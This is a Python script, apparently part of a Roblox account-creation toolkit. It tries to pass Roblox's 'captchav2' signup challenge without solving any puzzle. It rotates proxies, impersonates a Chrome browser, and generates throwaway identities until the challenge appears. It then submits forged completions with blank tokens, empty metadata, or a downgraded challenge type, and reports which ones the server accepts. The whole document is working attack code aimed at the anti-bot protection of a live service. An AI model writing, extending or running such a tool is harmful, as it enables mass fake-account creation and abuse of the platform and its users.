#!/usr/bin/env python3
"""Can `captchav2` be completed without a puzzle?

`captchav2` is ~40% of signup challenges. It carries no `dataExchangeBlob`, says
`mode: CAPTCHA_MODE_INVALID`, and has an empty `redemptionToken`. Every Arkose
tool in this repo retries until it gets the `captcha` flavour instead, because
`captchav2` has never been satisfied.

The client's own state machine (Challenge.js) completes it like this:

    SET_CHALLENGE_COMPLETED { onChallengeCompletedData: { redemptionToken: e } }

where `e` comes from the CaptchaV2 component. But the sibling *device integrity*
challenge completes with `{ integrityType: n, redemptionToken: "" }` when the
native check cannot run — an empty token is a legitimate completion there. If
`captchav2` is equally lenient, it is free.

So: get a real `captchav2` challenge, then try the plausible completions, a fresh
challenge per attempt so single-use semantics cannot confound the result.

    ./tools/captchav2_probe.py --proxy-file proxies.txt
    ./tools/captchav2_probe.py --proxy-file proxies.txt --variants all
"""

from __future__ import annotations

import argparse
import base64
import json
import random
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from roblox_creator.config import SIGNUP_POST, load_proxies
from roblox_creator.identity import make_identity
from roblox_creator.proxyurl import parse as parse_proxy

CONTINUE = "https://apis.roblox.com/challenge/v1/continue"
SIGNUP_HEADERS = {
    "origin": "https://www.roblox.com",
    "referer": "https://www.roblox.com/CreateAccount",
    "accept": "application/json, text/plain, */*",
}


def fresh_v2(proxy_url: str, tries: int = 12) -> dict | None:
    """Keep signing up until the server hands out a captchav2 challenge."""
    from curl_cffi import requests as creq

    session = creq.Session(impersonate="chrome", timeout=30)
    session.proxies = {"http": proxy_url, "https": proxy_url}
    identity = make_identity(random.Random())
    body = {"username": identity.username, "password": identity.password,
            "birthday": "1990-01-01"}
    headers = dict(SIGNUP_HEADERS)
    first = session.post(SIGNUP_POST, json=body, headers=headers)
    csrf = first.headers.get("x-csrf-token", "")
    if csrf:
        headers["x-csrf-token"] = csrf

    for _ in range(tries):
        resp = session.post(SIGNUP_POST, json=body, headers=headers)
        if resp.headers.get("rblx-challenge-type") == "captchav2":
            raw = resp.headers.get("rblx-challenge-metadata", "")
            meta = {}
            if raw:
                try:
                    meta = json.loads(base64.b64decode(raw + "=" * (-len(raw) % 4)))
                except Exception:
                    pass
            return {"id": resp.headers.get("rblx-challenge-id", ""),
                    "type": "captchav2", "raw_meta": raw, "meta": meta,
                    "body": body, "headers": headers, "csrf": csrf,
                    "session": session}
        body["username"] += str(random.randint(0, 9))
    return None


VARIANTS = {
    "continue-empty": "continue, challengeType captchav2, metadata {}",
    "continue-blank-token": "continue, metadata {redemptionToken: ''}",
    "continue-full-meta": "continue, whole metadata echoed back",
    "legacy-blank-token": "resubmit with rblx-challenge-metadata + blank token",
    "legacy-no-metadata": "resubmit with only rblx-challenge-id/type",
    "legacy-continue-mode": "continue with challengeType 'captcha'",
}


def attempt(challenge: dict, variant: str) -> dict:
    sess = challenge["session"]
    meta, cid = challenge["meta"], challenge["id"]

    if variant.startswith("continue") or variant == "legacy-continue-mode":
        ctype = "captcha" if variant == "legacy-continue-mode" else "captchav2"
        if variant == "continue-empty":
            payload_meta = {}
        elif variant == "continue-blank-token":
            payload_meta = {"redemptionToken": ""}
        else:
            payload_meta = dict(meta)
            payload_meta.setdefault("redemptionToken", "")
        resp = sess.post(CONTINUE, json={
            "challengeID": cid,
            "challengeType": ctype,
            "challengeMetadata": json.dumps(payload_meta, separators=(",", ":")),
        }, headers={
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://www.roblox.com",
            "referer": "https://www.roblox.com/CreateAccount",
            **({"x-csrf-token": challenge["csrf"]} if challenge["csrf"] else {}),
        })
    else:
        headers = dict(challenge["headers"])
        headers.update({"rblx-challenge-id": cid, "rblx-challenge-type": "captchav2"})
        if variant == "legacy-blank-token":
            merged = dict(meta, redemptionToken="")
            headers["rblx-challenge-metadata"] = base64.b64encode(
                json.dumps(merged).encode()).decode()
        resp = sess.post(SIGNUP_POST, json=challenge["body"], headers=headers)

    out = {"status": resp.status_code, "body": resp.text[:150]}
    for key, value in resp.headers.items():
        if key.lower().startswith("rblx-"):
            out[key] = value[:60]
    return out


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--proxy", default=None)
    ap.add_argument("--proxy-file", type=Path, default=ROOT / "proxies.txt")
    ap.add_argument("--variants", default="minimal")
    ap.add_argument("--reps", type=int, default=1)
    args = ap.parse_args()

    names = (list(VARIANTS) if args.variants == "all"
             else ["continue-blank-token", "legacy-blank-token"]
             if args.variants == "minimal"
             else [v.strip() for v in args.variants.split(",") if v.strip()])

    pool = [args.proxy] if args.proxy else load_proxies(args.proxy_file)
    print(f"  variants: {names}\n")

    wins = []
    for name in names:
        for _ in range(args.reps):
            proxy_url = parse_proxy(random.choice(pool)).url()
            challenge = fresh_v2(proxy_url)
            if not challenge:
                print(f"  {name:<22} no captchav2 offered in 12 signups")
                continue
            outcome = attempt(challenge, name)
            ok = outcome["status"] in (200, 201)
            if ok:
                wins.append((name, outcome))
            print(f"  {name:<22} {outcome['status']}  {outcome['body'][:100]}"
                  f"{'  ACCEPTED' if ok else ''}")
            time.sleep(0.4)

    print()
    if wins:
        print("  captchav2 accepted without a puzzle:")
        for name, outcome in wins:
            print(f"    {name} -> {outcome['status']} {outcome.get('body', '')[:80]}")
    else:
        print("  no completion accepted — captchav2 needs the real component token")
    return 0 if wins else 1


if __name__ == "__main__":
    raise SystemExit(main())
